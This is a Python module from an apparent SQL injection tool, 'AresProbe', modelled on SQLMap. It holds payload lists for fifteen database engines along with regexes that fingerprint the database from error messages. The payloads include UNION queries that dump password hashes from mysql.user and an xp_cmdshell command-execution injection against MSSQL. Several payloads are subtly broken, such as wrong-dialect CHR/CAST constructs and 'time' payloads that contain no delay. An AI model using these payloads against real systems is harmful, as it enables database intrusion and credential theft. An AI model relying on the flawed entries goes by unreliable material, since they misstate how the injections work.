"""
AresProbe Extended Database Support
Extended database support like SQLMap
"""

import re
from typing import Dict, List, Any
from dataclasses import dataclass
from enum import Enum

from .logger import Logger


class DatabaseType(Enum):
    """Extended database types supported"""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    # NEW DATABASES (SQLMap compatibility)
    ACCESS = "access"          # Microsoft Access
    DB2 = "db2"               # IBM DB2
    FIREBIRD = "firebird"     # Firebird
    MAXDB = "maxdb"           # SAP MaxDB
    SYBASE = "sybase"         # Sybase
    INFORMIX = "informix"     # Informix
    H2 = "h2"                 # H2 Database
    HSQLDB = "hsqldb"         # HSQLDB
    DERBY = "derby"           # Apache Derby
    SQLITE3 = "sqlite3"       # SQLite3


@dataclass
class DatabasePayloads:
    """Database-specific payloads"""
    name: str
    db_type: DatabaseType
    error_payloads: List[str]
    union_payloads: List[str]
    boolean_payloads: List[str]
    time_payloads: List[str]
    information_schema: Dict[str, str]
    version_functions: List[str]
    user_functions: List[str]
    database_functions: List[str]


class ExtendedDatabaseSupport:
    """
    Extended database support with SQLMap compatibility
    """
    
    def __init__(self, logger: Logger = None):
        self.logger = logger or Logger()
        self.database_payloads = self._load_database_payloads()
    
    def _load_database_payloads(self) -> Dict[DatabaseType, DatabasePayloads]:
        """Load payloads for all supported databases"""
        return {
            DatabaseType.MYSQL: self._get_mysql_payloads(),
            DatabaseType.POSTGRESQL: self._get_postgresql_payloads(),
            DatabaseType.MSSQL: self._get_mssql_payloads(),
            DatabaseType.ORACLE: self._get_oracle_payloads(),
            DatabaseType.SQLITE: self._get_sqlite_payloads(),
            DatabaseType.ACCESS: self._get_access_payloads(),
            DatabaseType.DB2: self._get_db2_payloads(),
            DatabaseType.FIREBIRD: self._get_firebird_payloads(),
            DatabaseType.MAXDB: self._get_maxdb_payloads(),
            DatabaseType.SYBASE: self._get_sybase_payloads(),
            DatabaseType.INFORMIX: self._get_informix_payloads(),
            DatabaseType.H2: self._get_h2_payloads(),
            DatabaseType.HSQLDB: self._get_hsqldb_payloads(),
            DatabaseType.DERBY: self._get_derby_payloads(),
            DatabaseType.SQLITE3: self._get_sqlite3_payloads()
        }
    
    def _get_mysql_payloads(self) -> DatabasePayloads:
        """MySQL payloads"""
        return DatabasePayloads(
            name="MySQL",
            db_type=DatabaseType.MYSQL,
            error_payloads=[
                "' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(COUNT(*) AS CHAR),0x7e,version(),0x7e)) FROM information_schema.tables WHERE table_schema=DATABASE()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
            ],
            union_payloads=[
                "' UNION SELECT version(),user(),database()--",
                "' UNION SELECT table_name,column_name FROM information_schema.columns--",
                "' UNION SELECT user,authentication_string FROM mysql.user--"
            ],
            boolean_payloads=[
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
            ],
            time_payloads=[
                "' AND (SELECT SLEEP(5))--",
                "' AND (SELECT BENCHMARK(5000000,MD5(1)))--"
            ],
            information_schema={
                'tables': 'information_schema.tables',
                'columns': 'information_schema.columns',
                'schemata': 'information_schema.schemata'
            },
            version_functions=['version()', '@@version'],
            user_functions=['user()', 'current_user()', 'session_user()'],
            database_functions=['database()', 'schema()']
        )
    
    def _get_postgresql_payloads(self) -> DatabasePayloads:
        """PostgreSQL payloads"""
        return DatabasePayloads(
            name="PostgreSQL",
            db_type=DatabaseType.POSTGRESQL,
            error_payloads=[
                "' AND (SELECT * FROM (SELECT CAST((CHR(126)||VERSION()||CHR(126)) AS NUMERIC))x)--",
                "' AND (SELECT * FROM (SELECT CAST((CHR(126)||(SELECT version())||CHR(126)) AS NUMERIC))x)--"
            ],
            union_payloads=[
                "' UNION SELECT version(),current_user,current_database()--",
                "' UNION SELECT tablename,columnname FROM pg_tables,information_schema.columns--"
            ],
            boolean_payloads=[
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM pg_tables)>0--"
            ],
            time_payloads=[
                "' AND pg_sleep(5)--",
                "' AND (SELECT pg_sleep(5))--"
            ],
            information_schema={
                'tables': 'information_schema.tables',
                'columns': 'information_schema.columns',
                'schemata': 'information_schema.schemata'
            },
            version_functions=['version()'],
            user_functions=['current_user', 'session_user', 'user'],
            database_functions=['current_database()', 'current_schema()']
        )
    
    def _get_mssql_payloads(self) -> DatabasePayloads:
        """MSSQL payloads"""
        return DatabasePayloads(
            name="Microsoft SQL Server",
            db_type=DatabaseType.MSSQL,
            error_payloads=[
                "'; EXEC xp_cmdshell('whoami')--",
                "' AND (SELECT * FROM (SELECT CAST((CHR(126)||@@version||CHR(126)) AS NUMERIC))x)--"
            ],
            union_payloads=[
                "' UNION SELECT @@version,user_name(),db_name()--",
                "' UNION SELECT name,type FROM sysobjects--"
            ],
            boolean_payloads=[
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM sysobjects)>0--"
            ],
            time_payloads=[
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT COUNT(*) FROM sysobjects WHERE name LIKE '%')>0--"
            ],
            information_schema={
                'tables': 'information_schema.tables',
                'columns': 'information_schema.columns',
                'schemata': 'information_schema.schemata'
            },
            version_functions=['@@version'],
            user_functions=['user_name()', 'suser_name()', 'current_user'],
            database_functions=['db_name()', 'database_name()']
        )
    
    def _get_oracle_payloads(self) -> DatabasePayloads:
        """Oracle payloads"""
        return DatabasePayloads(
            name="Oracle",
            db_type=DatabaseType.ORACLE,
            error_payloads=[
                "' AND (SELECT * FROM (SELECT CAST((CHR(126)||(SELECT banner FROM v$version WHERE rownum=1)||CHR(126)) AS NUMERIC))x FROM dual)--"
            ],
            union_payloads=[
                "' UNION SELECT banner,user,instance_name FROM v$version,v$instance--",
                "' UNION SELECT table_name,column_name FROM user_tab_columns--"
            ],
            boolean_payloads=[
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM user_tables)>0--"
            ],
            time_payloads=[
                "' AND (SELECT COUNT(*) FROM user_tables WHERE table_name LIKE '%')>0--"
            ],
            information_schema={
                'tables': 'user_tables',
                'columns': 'user_tab_columns',
                'schemata': 'user_users'
            },
            version_functions=['banner FROM v$version'],
            user_functions=['user', 'sys_context'],
            database_functions=['instance_name FROM v$instance']
        )
    
    def _get_sqlite_payloads(self) -> DatabasePayloads:
        """SQLite payloads"""
        return DatabasePayloads(
            name="SQLite",
            db_type=DatabaseType.SQLITE,
            error_payloads=[
                "' AND (SELECT * FROM (SELECT CAST((CHR(126)||sqlite_version()||CHR(126)) AS NUMERIC))x)--"
            ],
            union_payloads=[
                "' UNION SELECT sqlite_version(),'user','database'--",
                "' UNION SELECT name,sql FROM sqlite_master--"
            ],
            boolean_payloads=[
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM sqlite_master)>0--"
            ],
            time_payloads=[
                "' AND (SELECT COUNT(*) FROM sqlite_master WHERE name LIKE '%')>0--"
            ],
            information_schema={
                'tables': 'sqlite_master',
                'columns': 'sqlite_master',
                'schemata': 'sqlite_master'
            },
            version_functions=['sqlite_version()'],
            user_functions=['user', 'current_user'],
            database_functions=['database', 'current_database']
        )
    
    def _get_access_payloads(self) -> DatabasePayloads:
        """Microsoft Access payloads"""
        return DatabasePayloads(
            name="Microsoft Access",
            db_type=DatabaseType.ACCESS,
            error_payloads=[
                "' AND (SELECT * FROM (SELECT CAST((CHR(126)||(SELECT @@version)||CHR(126)) AS NUMERIC))x)--"
            ],
            union_payloads=[
                "' UNION SELECT @@version,'user','database'--",
                "' UNION SELECT name,type FROM msysobjects--"
            ],
            boolean_payloads=[
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM msysobjects)>0--"
            ],
            time_payloads=[
                "' AND (SELECT COUNT(*) FROM msysobjects WHERE name LIKE '%')>0--"
            ],
            information_schema={
                'tables': 'msysobjects',
                'columns': 'msysobjects',
                'schemata': 'msysobjects'
            },
            version_functions=['@@version'],
            user_functions=['user', 'current_user'],
            database_functions=['database', 'current_database']
        )
    
    def _get_db2_payloads(self) -> DatabasePayloads:
        """IBM DB2 payloads"""
        return DatabasePayloads(
            name="IBM DB2",
            db_type=DatabaseType.DB2,
            error_payloads=[
                "' AND (SELECT * FROM (SELECT CAST((CHR(126)||(SELECT version FROM sysibm.sysdummy1)||CHR(126)) AS NUMERIC))x)--"
            ],
            union_payloads=[
                "' UNION SELECT version,user,current_schema FROM sysibm.sysdummy1--",
                "' UNION SELECT tabname,colname FROM syscat.columns--"
            ],
            boolean_payloads=[
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM syscat.tables)>0--"
            ],
            time_payloads=[
                "' AND (SELECT COUNT(*) FROM syscat.tables WHERE tabname LIKE '%')>0--"
            ],
            information_schema={
                'tables': 'syscat.tables',
                'columns': 'syscat.columns',
                'schemata': 'syscat.schemata'
            },
            version_functions=['version FROM sysibm.sysdummy1'],
            user_functions=['user', 'current_user'],
            database_functions=['current_schema', 'current_database']
        )
    
    def _get_firebird_payloads(self) -> DatabasePayloads:
        """Firebird payloads"""
        return DatabasePayloads(
            name="Firebird",
            db_type=DatabaseType.FIREBIRD,
            error_payloads=[
                "' AND (SELECT * FROM (SELECT CAST((CHR(126)||(SELECT rdb$get_context('SYSTEM','ENGINE_VERSION'))||CHR(126)) AS NUMERIC))x)--"
            ],
            union_payloads=[
                "' UNION SELECT rdb$get_context('SYSTEM','ENGINE_VERSION'),current_user,current_role FROM rdb$database--",
                "' UNION SELECT rdb$relation_name,rdb$field_name FROM rdb$relation_fields--"
            ],
            boolean_payloads=[
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM rdb$relations)>0--"
            ],
            time_payloads=[
                "' AND (SELECT COUNT(*) FROM rdb$relations WHERE rdb$relation_name LIKE '%')>0--"
            ],
            information_schema={
                'tables': 'rdb$relations',
                'columns': 'rdb$relation_fields',
                'schemata': 'rdb$database'
            },
            version_functions=['rdb$get_context(\'SYSTEM\',\'ENGINE_VERSION\')'],
            user_functions=['current_user', 'current_role'],
            database_functions=['current_database', 'current_schema']
        )
    
    def _get_maxdb_payloads(self) -> DatabasePayloads:
        """SAP MaxDB payloads"""
        return DatabasePayloads(
            name="SAP MaxDB",
            db_type=DatabaseType.MAXDB,
            error_payloads=[
                "' AND (SELECT * FROM (SELECT CAST((CHR(126)||(SELECT version())||CHR(126)) AS NUMERIC))x)--"
            ],
            union_payloads=[
                "' UNION SELECT version(),user,database--",
                "' UNION SELECT tablename,columnname FROM systables,syscolumns--"
            ],
            boolean_payloads=[
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM systables)>0--"
            ],
            time_payloads=[
                "' AND (SELECT COUNT(*) FROM systables WHERE tablename LIKE '%')>0--"
            ],
            information_schema={
                'tables': 'systables',
                'columns': 'syscolumns',
                'schemata': 'systables'
            },
            version_functions=['version()'],
            user_functions=['user', 'current_user'],
            database_functions=['database', 'current_database']
        )
    
    def _get_sybase_payloads(self) -> DatabasePayloads:
        """Sybase payloads"""
        return DatabasePayloads(
            name="Sybase",
            db_type=DatabaseType.SYBASE,
            error_payloads=[
                "' AND (SELECT * FROM (SELECT CAST((CHR(126)||@@version||CHR(126)) AS NUMERIC))x)--"
            ],
            union_payloads=[
                "' UNION SELECT @@version,user_name(),db_name()--",
                "' UNION SELECT name,type FROM sysobjects--"
            ],
            boolean_payloads=[
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM sysobjects)>0--"
            ],
            time_payloads=[
                "' AND (SELECT COUNT(*) FROM sysobjects WHERE name LIKE '%')>0--"
            ],
            information_schema={
                'tables': 'sysobjects',
                'columns': 'syscolumns',
                'schemata': 'sysdatabases'
            },
            version_functions=['@@version'],
            user_functions=['user_name()', 'suser_name()'],
            database_functions=['db_name()', 'database_name()']
        )
    
    def _get_informix_payloads(self) -> DatabasePayloads:
        """Informix payloads"""
        return DatabasePayloads(
            name="Informix",
            db_type=DatabaseType.INFORMIX,
            error_payloads=[
                "' AND (SELECT * FROM (SELECT CAST((CHR(126)||(SELECT version())||CHR(126)) AS NUMERIC))x)--"
            ],
            union_payloads=[
                "' UNION SELECT version(),user,database--",
                "' UNION SELECT tabname,colname FROM systables,syscolumns--"
            ],
            boolean_payloads=[
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM systables)>0--"
            ],
            time_payloads=[
                "' AND (SELECT COUNT(*) FROM systables WHERE tabname LIKE '%')>0--"
            ],
            information_schema={
                'tables': 'systables',
                'columns': 'syscolumns',
                'schemata': 'systables'
            },
            version_functions=['version()'],
            user_functions=['user', 'current_user'],
            database_functions=['database', 'current_database']
        )
    
    def _get_h2_payloads(self) -> DatabasePayloads:
        """H2 Database payloads"""
        return DatabasePayloads(
            name="H2 Database",
            db_type=DatabaseType.H2,
            error_payloads=[
                "' AND (SELECT * FROM (SELECT CAST((CHR(126)||(SELECT H2VERSION())||CHR(126)) AS NUMERIC))x)--"
            ],
            union_payloads=[
                "' UNION SELECT H2VERSION(),user,database--",
                "' UNION SELECT table_name,column_name FROM information_schema.columns--"
            ],
            boolean_payloads=[
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
            ],
            time_payloads=[
                "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '%')>0--"
            ],
            information_schema={
                'tables': 'information_schema.tables',
                'columns': 'information_schema.columns',
                'schemata': 'information_schema.schemata'
            },
            version_functions=['H2VERSION()'],
            user_functions=['user', 'current_user'],
            database_functions=['database', 'current_database']
        )
    
    def _get_hsqldb_payloads(self) -> DatabasePayloads:
        """HSQLDB payloads"""
        return DatabasePayloads(
            name="HSQLDB",
            db_type=DatabaseType.HSQLDB,
            error_payloads=[
                "' AND (SELECT * FROM (SELECT CAST((CHR(126)||(SELECT version())||CHR(126)) AS NUMERIC))x)--"
            ],
            union_payloads=[
                "' UNION SELECT version(),user,database--",
                "' UNION SELECT table_name,column_name FROM information_schema.columns--"
            ],
            boolean_payloads=[
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
            ],
            time_payloads=[
                "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '%')>0--"
            ],
            information_schema={
                'tables': 'information_schema.tables',
                'columns': 'information_schema.columns',
                'schemata': 'information_schema.schemata'
            },
            version_functions=['version()'],
            user_functions=['user', 'current_user'],
            database_functions=['database', 'current_database']
        )
    
    def _get_derby_payloads(self) -> DatabasePayloads:
        """Apache Derby payloads"""
        return DatabasePayloads(
            name="Apache Derby",
            db_type=DatabaseType.DERBY,
            error_payloads=[
                "' AND (SELECT * FROM (SELECT CAST((CHR(126)||(SELECT version())||CHR(126)) AS NUMERIC))x)--"
            ],
            union_payloads=[
                "' UNION SELECT version(),user,database--",
                "' UNION SELECT table_name,column_name FROM sys.systables,sys.syscolumns--"
            ],
            boolean_payloads=[
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM sys.systables)>0--"
            ],
            time_payloads=[
                "' AND (SELECT COUNT(*) FROM sys.systables WHERE tablename LIKE '%')>0--"
            ],
            information_schema={
                'tables': 'sys.systables',
                'columns': 'sys.syscolumns',
                'schemata': 'sys.sysschemas'
            },
            version_functions=['version()'],
            user_functions=['user', 'current_user'],
            database_functions=['database', 'current_database']
        )
    
    def _get_sqlite3_payloads(self) -> DatabasePayloads:
        """SQLite3 payloads"""
        return DatabasePayloads(
            name="SQLite3",
            db_type=DatabaseType.SQLITE3,
            error_payloads=[
                "' AND (SELECT * FROM (SELECT CAST((CHR(126)||sqlite_version()||CHR(126)) AS NUMERIC))x)--"
            ],
            union_payloads=[
                "' UNION SELECT sqlite_version(),'user','database'--",
                "' UNION SELECT name,sql FROM sqlite_master--"
            ],
            boolean_payloads=[
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM sqlite_master)>0--"
            ],
            time_payloads=[
                "' AND (SELECT COUNT(*) FROM sqlite_master WHERE name LIKE '%')>0--"
            ],
            information_schema={
                'tables': 'sqlite_master',
                'columns': 'sqlite_master',
                'schemata': 'sqlite_master'
            },
            version_functions=['sqlite_version()'],
            user_functions=['user', 'current_user'],
            database_functions=['database', 'current_database']
        )
    
    def get_database_payloads(self, db_type: DatabaseType) -> DatabasePayloads:
        """Get payloads for specific database type"""
        return self.database_payloads.get(db_type)
    
    def get_supported_databases(self) -> List[DatabaseType]:
        """Get list of supported database types"""
        return list(self.database_payloads.keys())
    
    def detect_database_type(self, response_text: str) -> List[DatabaseType]:
        """Detect database type from response"""
        detected_types = []
        
        # Database-specific patterns
        patterns = {
            DatabaseType.MYSQL: [
                r'mysql_fetch_array',
                r'mysql server version',
                r'valid mysql result',
                r'check the manual that corresponds to your mysql server version'
            ],
            DatabaseType.POSTGRESQL: [
                r'postgresql.*error',
                r'postgres.*error',
                r'pg_.*error'
            ],
            DatabaseType.MSSQL: [
                r'microsoft.*odbc.*sql server',
                r'sql server.*error',
                r'odbc.*sql server'
            ],
            DatabaseType.ORACLE: [
                r'ora-\d+',
                r'oracle.*error',
                r'ora-'
            ],
            DatabaseType.SQLITE: [
                r'sqlite.*error',
                r'sqlite3.*error'
            ],
            DatabaseType.ACCESS: [
                r'microsoft.*access',
                r'access.*error',
                r'jet.*database'
            ],
            DatabaseType.DB2: [
                r'db2.*error',
                r'ibm.*db2',
                r'sql\d+.*error'
            ],
            DatabaseType.FIREBIRD: [
                r'firebird.*error',
                r'ibase.*error'
            ],
            DatabaseType.MAXDB: [
                r'maxdb.*error',
                r'sap.*maxdb'
            ],
            DatabaseType.SYBASE: [
                r'sybase.*error',
                r'adaptive server'
            ],
            DatabaseType.INFORMIX: [
                r'informix.*error',
                r'ids.*error'
            ],
            DatabaseType.H2: [
                r'h2.*error',
                r'h2database'
            ],
            DatabaseType.HSQLDB: [
                r'hsqldb.*error',
                r'hsql.*error'
            ],
            DatabaseType.DERBY: [
                r'derby.*error',
                r'apache.*derby'
            ]
        }
        
        response_lower = response_text.lower()
        
        for db_type, db_patterns in patterns.items():
            for pattern in db_patterns:
                if re.search(pattern, response_lower):
                    detected_types.append(db_type)
                    break
        
        return detected_types
